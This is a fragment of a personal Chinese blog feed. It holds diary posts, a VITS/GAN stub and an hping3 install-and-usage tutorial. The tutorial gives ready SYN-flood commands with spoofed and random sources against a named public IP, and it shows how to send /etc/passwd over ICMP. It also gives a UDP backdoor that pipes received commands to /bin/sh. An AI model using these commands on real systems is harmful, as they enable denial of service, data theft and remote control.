    <content type="html"><![CDATA[<h1 id="VITS"><a href="#VITS" class="headerlink" title="VITS"></a>VITS</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="GAN-生成式对抗网络"><a href="#GAN-生成式对抗网络" class="headerlink" title="GAN(生成式对抗网络)"></a>GAN(生成式对抗网络)</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/2024/09/16/17264749442551.jpg" alt></p><h4 id="图例"><a href="#图例" class="headerlink" title="图例"></a>图例</h4><ul><li>D:判别器</li><li>G:生成器</li><li>z:简单分布</li><li>D和G分别交叉训练<ul><li>当训练D的时候，固定G，直到D能区分是真实的x还是虚假的G(z)</li><li>当训练G的时候，固定D，能够让G生成的fake数据欺骗判别器D<h4 id="生成器和判别器公式"><a href="#生成器和判别器公式" class="headerlink" title="生成器和判别器公式"></a>生成器和判别器公式</h4><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/2024/09/16/17264751004966.jpg" alt><h3 id="VAE-Variational-Auto-encoder-变分自编码器"><a href="#VAE-Variational-Auto-encoder-变分自编码器" class="headerlink" title="VAE(Variational Auto-encoder) 变分自编码器"></a>VAE(Variational Auto-encoder) 变分自编码器</h3></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VITS&quot;&gt;&lt;a href=&quot;#VITS&quot; class=&quot;headerlink&quot; title=&quot;VITS&quot;&gt;&lt;/a&gt;VITS&lt;/h1&gt;&lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>我回来了</title>
    <link href="https://www.scery.com/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86.htm"/>
    <id>https://www.scery.com/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86.htm</id>
    <published>2024-04-26T02:39:02.000Z</published>
    <updated>2024-04-26T02:50:40.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="许久不见，甚是想念"><a href="#许久不见，甚是想念" class="headerlink" title="许久不见，甚是想念"></a>许久不见，甚是想念</h1><h2 id="博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl"><a href="#博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl" class="headerlink" title="博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl"></a>博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl</h2><p>由于近期比较忙碌，退役后也陆陆续续回归正轨了，进入人生的下一阶段，感慨万千。</p><h3 id="今年剩下的阶段："><a href="#今年剩下的阶段：" class="headerlink" title="今年剩下的阶段："></a>今年剩下的阶段：</h3><ul><li><del>毕业论文/设计+答辩</del></li><li>毕业典礼</li><li>算法岗实习</li><li>研究生入学</li></ul><p>愿大家顺顺利利，未来可期！<br><br>给大家看一只贱狗：<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/town/202404261048913.JPG" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;许久不见，甚是想念&quot;&gt;&lt;a href=&quot;#许久不见，甚是想念&quot; class=&quot;headerlink&quot; title=&quot;许久不见，甚是想念&quot;&gt;&lt;/a&gt;许久不见，甚是想念&lt;/h1&gt;&lt;h2 id=&quot;博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>大年初四</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E5%9B%9B.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E5%9B%9B.htm</id>
    <published>2023-01-25T14:02:52.000Z</published>
    <updated>2024-12-16T00:44:28.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初四"><a href="#大年初四" class="headerlink" title="大年初四"></a>大年初四</h1><h2 id="假期余额不足，已经过了5天了呜呜呜"><a href="#假期余额不足，已经过了5天了呜呜呜" class="headerlink" title="假期余额不足，已经过了5天了呜呜呜"></a>假期余额不足，已经过了5天了呜呜呜</h2><h5 id="今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。"><a href="#今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。" class="headerlink" title="今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。"></a>今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。</h5><h4 id="今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。"><a href="#今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。" class="headerlink" title="今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。"></a>今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。</h4><iframe src="//player.bilibili.com/player.html?aid=644920671&bvid=BV1GY4y1u7S1&cid=815206879&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><iframe src="//player.bilibili.com/player.html?aid=480502721&bvid=BV1ZT411m7eY&cid=970872175&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><iframe src="//player.bilibili.com/player.html?aid=308235093&bvid=BV1pA411d7MK&cid=974163244&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初四&quot;&gt;&lt;a href=&quot;#大年初四&quot; class=&quot;headerlink&quot; title=&quot;大年初四&quot;&gt;&lt;/a&gt;大年初四&lt;/h1&gt;&lt;h2 id=&quot;假期余额不足，已经过了5天了呜呜呜&quot;&gt;&lt;a href=&quot;#假期余额不足，已经过了5天了呜呜呜&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>大年初三</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%89.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%89.htm</id>
    <published>2023-01-24T11:11:47.000Z</published>
    <updated>2024-12-16T00:48:37.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初三"><a href="#大年初三" class="headerlink" title="大年初三"></a>大年初三</h1><h2 id="今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。"><a href="#今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。" class="headerlink" title="今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。"></a>今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。</h2><p>今天早上收垃圾换人啦，顺势把一些后端服务修复了，下午4点起床去看《满江红》，看了两个小时，带回汇餐了，还有30多分钟没看，因为吃太多香蕉了，回来马上去厕所喷射了，回来都在吃了（图是别人拍的为什么没对上焦的原因），虾仁猪心。</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241946017.png" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241946017.png"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910399.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910399.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910400.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910400.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910401.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910401.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910402.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910402.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910404.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910404.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初三&quot;&gt;&lt;a href=&quot;#大年初三&quot; class=&quot;headerlink&quot; title=&quot;大年初三&quot;&gt;&lt;/a&gt;大年初三&lt;/h1&gt;&lt;h2 id=&quot;今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>大年初二</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%BA%8C.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%BA%8C.htm</id>
    <published>2023-01-23T01:46:31.000Z</published>
    <updated>2024-03-18T02:51:00.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初二碎碎念"><a href="#大年初二碎碎念" class="headerlink" title="大年初二碎碎念"></a>大年初二碎碎念</h1><h2 id="早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿"><a href="#早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿" class="headerlink" title="早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿"></a>早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿</h2><p>今天想必是回娘家的回娘家，去外婆家的去外婆家拜年啦，祝大家收多点5块钱人民币的大红包🧧。</p><p>🌿，今天早上要去收垃圾，真尼玛又脏又臭！</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923803.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923803.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923805.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923805.jpg！"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初二碎碎念&quot;&gt;&lt;a href=&quot;#大年初二碎碎念&quot; class=&quot;headerlink&quot; title=&quot;大年初二碎碎念&quot;&gt;&lt;/a&gt;大年初二碎碎念&lt;/h1&gt;&lt;h2 id=&quot;早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿&quot;&gt;&lt;a href=&quot;#早</summary>
      
    
    
    
    <category term="生活日常" scheme="https://www.scery.com/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="生活日常" scheme="https://www.scery.com/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    <category term="碎碎文" scheme="https://www.scery.com/tags/%E7%A2%8E%E7%A2%8E%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>大年初一</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%80.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%80.htm</id>
    <published>2023-01-22T08:44:42.000Z</published>
    <updated>2024-12-16T00:48:10.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初一"><a href="#大年初一" class="headerlink" title="大年初一"></a>大年初一</h1><h2 id="祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！"><a href="#祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！" class="headerlink" title="祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！"></a>祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！</h2><p><strong><em>今日活动</em></strong></p><table><thead><tr><th>时间</th><th>活动</th></tr></thead><tbody><tr><td>早上</td><td>游园</td></tr><tr><td>下午</td><td>钩机牌</td></tr><tr><td>晚上</td><td>流浪地球</td></tr></tbody></table><p>​    好久没发过博客了，有空刷刷存在感才行🐰🐰🐰。</p><p>​    在这里的日子过得节特别有年味，毕竟无论到节日布置(灯笼，彩旗，兔子灯饰)、板报设计、手写几十副对联、刷漆等等等都是自己搞的，这也是我在这过的最后一个年啦，虽然活动是强制要求的，每天都有俩活动，但是玩的是其乐融融，重要的是里面的人关系比较单纯，都是出生入死的兄弟。比起在家里的冷冷清清，除了打麻将就是玩电脑抠手机，烟花可能找不到地方买了，除非在乡下。</p><h4 id="不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红"><a href="#不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红" class="headerlink" title="不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红"></a>不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20230122172002.png" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20230122172002.png"></p><iframe src="//player.bilibili.com/player.html?aid=393018479&bvid=BV1ad4y1V7wb&cid=971466390&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初一&quot;&gt;&lt;a href=&quot;#大年初一&quot; class=&quot;headerlink&quot; title=&quot;大年初一&quot;&gt;&lt;/a&gt;大年初一&lt;/h1&gt;&lt;h2 id=&quot;祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！&quot;&gt;&lt;a href=&quot;#祝各位新年快乐哈，兔年大吉</summary>
      
    
    
    
    <category term="生活日常" scheme="https://www.scery.com/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="生活日常" scheme="https://www.scery.com/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    <category term="碎碎文" scheme="https://www.scery.com/tags/%E7%A2%8E%E7%A2%8E%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>Hping3编译安装和使用方法</title>
    <link href="https://www.scery.com/hping3%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.htm"/>
    <id>https://www.scery.com/hping3%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.htm</id>
    <published>2021-03-01T00:19:43.000Z</published>
    <updated>2024-03-18T02:51:00.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hping3编译安装和使用方法"><a href="#Hping3编译安装和使用方法" class="headerlink" title="Hping3编译安装和使用方法"></a>Hping3编译安装和使用方法</h1><h3 id="基于centos7系统安装过程"><a href="#基于centos7系统安装过程" class="headerlink" title="基于centos7系统安装过程"></a>基于centos7系统安装过程</h3><h4 id="1-安装好组件"><a href="#1-安装好组件" class="headerlink" title="1.安装好组件"></a>1.安装好组件</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">yum -y install tcl tcl-devel libpcap libpcap-devel</span><br><span class="line">ln -s <span class="regexp">/usr/i</span>nclude<span class="regexp">/pcap-bpf.h /u</span>sr<span class="regexp">/include/</span>net/bpf.h</span><br><span class="line">wget http:<span class="regexp">//</span>www.hping.org/hping3-<span class="number">20051105</span>.tar.gz</span><br><span class="line">tar -zxvf hping3-<span class="number">20051105</span>.tar.gz</span><br><span class="line">cd hping3-<span class="number">20051105</span></span><br></pre></td></tr></table></figure><h4 id="2-修改bytesex-h文件-加多一行x86-64支持"><a href="#2-修改bytesex-h文件-加多一行x86-64支持" class="headerlink" title="2.修改bytesex.h文件(加多一行x86_64支持)"></a>2.修改bytesex.h文件(加多一行x86_64支持)</h4><p>不然会报错</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20190401103738521.png" alt="img"></p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#if     defined(__i386__) \</span></span><br><span class="line">        || <span class="keyword">defined</span>(__x86_64__) \</span><br><span class="line">        || <span class="keyword">defined</span>(__alpha__) \</span><br><span class="line">        || (<span class="keyword">defined</span>(__mips__) &amp;&amp; (<span class="keyword">defined</span>(MIPSEL) || <span class="keyword">defined</span> (__MIPSEL__)))</span><br></pre></td></tr></table></figure><h4 id="3-创建好目录"><a href="#3-创建好目录" class="headerlink" title="3.创建好目录"></a>3.创建好目录</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/usr/</span>local/man</span><br><span class="line">mkdir <span class="regexp">/usr/</span>local<span class="regexp">/man/m</span>an8</span><br></pre></td></tr></table></figure><h4 id="4-编译和安装"><a href="#4-编译和安装" class="headerlink" title="4.编译和安装"></a>4.编译和安装</h4><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> install</span><br></pre></td></tr></table></figure><h3 id="可能出现的其他问题"><a href="#可能出现的其他问题" class="headerlink" title="可能出现的其他问题"></a>可能出现的其他问题</h3><h4 id="1-main-c-29-18-fatal-error-pcap-h-No-such-file-or-directoryX"><a href="#1-main-c-29-18-fatal-error-pcap-h-No-such-file-or-directoryX" class="headerlink" title="1.main.c:29:18: fatal error: pcap.h: No such file or directoryX"></a>1.main.c:29:18: fatal error: pcap.h: No such file or directoryX</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>我们缺少pcap库，安装</span><br><span class="line">yum install -y libpcap libpcap-devel</span><br></pre></td></tr></table></figure><h4 id="2-libpcap-stuff-c-20-21-fatal-error-net-bpf-h-No-such-file-or-directory"><a href="#2-libpcap-stuff-c-20-21-fatal-error-net-bpf-h-No-such-file-or-directory" class="headerlink" title="2.libpcap_stuff.c:20:21: fatal error: net/bpf.h: No such file or directory"></a>2.libpcap_stuff.c:20:21: fatal error: net/bpf.h: No such file or directory</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>创建一个软链接</span><br><span class="line">ln -sf <span class="regexp">/usr/i</span>nclude<span class="regexp">/pcap-bpf.h /u</span>sr<span class="regexp">/include/</span>net/bpf.h</span><br></pre></td></tr></table></figure><h4 id="3-cannot-find-ltcl"><a href="#3-cannot-find-ltcl" class="headerlink" title="3.cannot find -ltcl"></a>3.cannot find -ltcl</h4><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">//我们需要安装<span class="keyword">tcl</span>库</span><br><span class="line">yum -<span class="keyword">y</span> install <span class="keyword">tcl</span> <span class="keyword">tcl</span>-devel</span><br></pre></td></tr></table></figure><h4 id="4-Can’t-install-the-man-page-usr-local-confd-man-man8-does-not-exist"><a href="#4-Can’t-install-the-man-page-usr-local-confd-man-man8-does-not-exist" class="headerlink" title="4.Can’t install the man page: /usr/local/confd/man/man8 does not exist"></a>4.Can’t install the man page: /usr/local/confd/man/man8 does not exist</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">有可能环境没有<span class="regexp">/usr/</span>local<span class="regexp">/confd/m</span>an8目录，我们可以手动创建此目录，或者自己修改脚本实现(我们需要把INSTALL_MANPATH改为<span class="regexp">/usr/</span>local<span class="regexp">/confd/m</span>an）</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="1-防火墙测试"><a href="#1-防火墙测试" class="headerlink" title="1.防火墙测试"></a>1.防火墙测试</h4><p>测试防火墙对ICMP包的反应、是否支持<a href="http://man.linuxde.net/traceroute">traceroute</a>、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hping3</span> -S  -c <span class="number">1000000</span> -a <span class="number">10.10.10.10</span> -p <span class="number">21</span> <span class="number">10.10.10.10</span></span><br></pre></td></tr></table></figure><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hping3 -<span class="selector-tag">I</span> eth0  -S <span class="number">192.168</span>.<span class="number">10.1</span> -<span class="selector-tag">p</span> <span class="number">80</span></span><br><span class="line">//其中-<span class="selector-tag">I</span> eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-<span class="selector-tag">p</span> <span class="number">80</span>指定探测的目的端口。</span><br></pre></td></tr></table></figure><h4 id="3-Idle扫描"><a href="#3-Idle扫描" class="headerlink" title="3.Idle扫描"></a>3.Idle扫描</h4><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p><p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><h4 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4.拒绝服务攻击"></a>4.拒绝服务攻击</h4><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hping3</span> -I eth0 -a 你的ip -S <span class="number">8.134.53.173</span> -p <span class="number">443</span> -i u1000</span><br><span class="line"><span class="attribute">hping3</span> -c <span class="number">10000</span> -d <span class="number">1200000000</span> -S -w <span class="number">644</span> -p <span class="number">1688</span> --flood --rand-source <span class="number">8.134.53.173</span></span><br></pre></td></tr></table></figure><h4 id="5-文件传输"><a href="#5-文件传输" class="headerlink" title="5.文件传输"></a>5.文件传输</h4><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">hping3 192</span><span class="string">.</span><span class="comment">168</span><span class="string">.</span><span class="comment">1</span><span class="string">.</span><span class="comment">159</span><span class="literal">--</span><span class="comment">listen signature</span> <span class="literal">--</span><span class="comment">safe</span>  <span class="literal">--</span><span class="comment">icmp</span></span><br></pre></td></tr></table></figure><p>监听ICMP包中的签名，根据签名解析出文件内容。</p><p>在发送端使用签名打包的ICMP包发送文件：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">hping3 192.168.1.108<span class="params">--icmp</span> ?d 100 <span class="params">--sign</span> signature <span class="params">--file</span> <span class="string">/etc/passwd</span></span><br></pre></td></tr></table></figure><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><h4 id="6-木马功能"><a href="#6-木马功能" class="headerlink" title="6.木马功能"></a>6.木马功能</h4><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与<a href="http://man.linuxde.net/nc_netcat">netcat</a>的后门功能类似。</p><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p><p>在木马启动端：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">hping3 192.168.10.66<span class="params">--listen</span> signature <span class="params">--safe</span> <span class="params">--udp</span> -p 53 | <span class="string">/bin/sh</span></span><br></pre></td></tr></table></figure><p>在远程控制端：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">ls</span> &gt;test.cmd</span><br><span class="line">hping3 192.168.10.44 -p53 -d 100 <span class="params">--udp</span> <span class="params">--sign</span> siganature <span class="params">--file</span> <span class="string">./test.cmd</span></span><br></pre></td></tr></table></figure><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p><h3 id="hping3选项"><a href="#hping3选项" class="headerlink" title="hping3选项"></a>hping3选项</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">-H <span class="attr">--help</span> 显示帮助。</span><br><span class="line">-v -VERSION 版本信息。</span><br><span class="line">-c <span class="attr">--count</span> count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。</span><br><span class="line">-<span class="selector-tag">i</span> <span class="attr">--interval</span> 包发送间隔时间（单位是毫秒）缺省时间是<span class="number">1</span>秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发<span class="number">10</span>个数据包。</span><br><span class="line">-n -nmeric 数字输出，象征性输出主机地址。</span><br><span class="line">-<span class="selector-tag">q</span> -quiet 退出。</span><br><span class="line">-I <span class="attr">--interface</span> interface name 无非就是eth0之类的参数。</span><br><span class="line">-v <span class="attr">--verbose</span> 显示很多信息，TCP回应一般如：len=<span class="number">46</span> ip=<span class="number">192.168</span>.<span class="number">1.1</span> flags=RADF seq=<span class="number">0</span> ttl=<span class="number">255</span> id=<span class="number">0</span> win=<span class="number">0</span> rtt=<span class="number">0.4ms</span> tos=<span class="number">0</span> iplen=<span class="number">40</span> seq=<span class="number">0</span> ack=<span class="number">1380893504</span> sum=<span class="number">2010</span> urp=<span class="number">0</span></span><br><span class="line">-D <span class="attr">--debug</span> 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）</span><br><span class="line">-z <span class="attr">--bind</span> 快捷键的使用。</span><br><span class="line">-Z <span class="attr">--unbind</span> 消除快捷键。</span><br><span class="line">-O <span class="attr">--rawip</span> RAWIP模式，在此模式下HPING会发送带数据的IP头。</span><br><span class="line">-<span class="number">1</span> <span class="attr">--icmp</span> ICMP模式，此模式下HPING会发送IGMP应答报，你可以用<span class="attr">--ICMPTYPE</span> <span class="attr">--ICMPCODE</span>选项发送其他类型/模式的ICMP报文。</span><br><span class="line">-<span class="number">2</span> <span class="attr">--udp</span> UDP 模式，缺省下，HPING会发送UDP报文到主机的<span class="number">0</span>端口，你可以用<span class="attr">--baseport</span> <span class="attr">--destport</span> <span class="attr">--keep</span>选项指定其模式。</span><br><span class="line">-<span class="number">9</span> <span class="attr">--listen</span> signatuer hping的listen模式，用此模式，HPING会接收指定的数据。</span><br><span class="line">-<span class="selector-tag">a</span> <span class="attr">--spoof</span> hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span><br><span class="line">-t <span class="attr">--ttl</span> <span class="selector-tag">time</span> to live 可以指定发出包的TTL值。</span><br><span class="line">-H <span class="attr">--ipproto</span> 在RAW IP模式里选择IP协议。</span><br><span class="line">-w <span class="attr">--WINID</span> UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span><br><span class="line">-r <span class="attr">--rel</span> 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span><br><span class="line">-F <span class="attr">--FRAG</span> 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是<span class="number">16</span>字节。</span><br><span class="line">-x <span class="attr">--morefrag</span> 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。</span><br><span class="line">-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。</span><br><span class="line">-G <span class="attr">--fragoff</span> fragment offset value set the fragment offset</span><br><span class="line">-m <span class="attr">--mtu</span> mtu value 用此项后ID数值变得很大，<span class="number">50000</span>没指定此项时<span class="number">3000</span>-<span class="number">20000</span>左右。</span><br><span class="line">-G <span class="attr">--rroute</span> 记录路由，可以看到详悉的数据等等，最多可以经过<span class="number">9</span>个路由，即使主机屏蔽了ICMP报文。</span><br><span class="line">-C <span class="attr">--ICMPTYPE</span> type 指定ICMP类型，缺省是ICMP echo REQUEST。</span><br><span class="line">-K <span class="attr">--ICMPCODE</span> CODE 指定ICMP代号，缺省<span class="number">0</span>。</span><br><span class="line"><span class="attr">--icmp-ipver</span> 把IP版本也插入IP头。</span><br><span class="line"><span class="attr">--icmp-iphlen</span> 设置IP头的长度，缺省为<span class="number">5</span>（<span class="number">32</span>字节）。</span><br><span class="line"><span class="attr">--icmp-iplen</span> 设置IP包长度。</span><br><span class="line"><span class="attr">--icmp-ipid</span> 设置ICMP报文IP头的ID，缺省是RANDOM。</span><br><span class="line"><span class="attr">--icmp-ipproto</span> 设置协议的，缺省是TCP。</span><br><span class="line">-icmp-cksum 设置校验和。</span><br><span class="line">-icmp-ts alias <span class="keyword">for</span> <span class="attr">--icmptype</span> <span class="number">13</span> (to send ICMP timestamp requests)</span><br><span class="line"><span class="attr">--icmp-addr</span> Alias <span class="keyword">for</span> 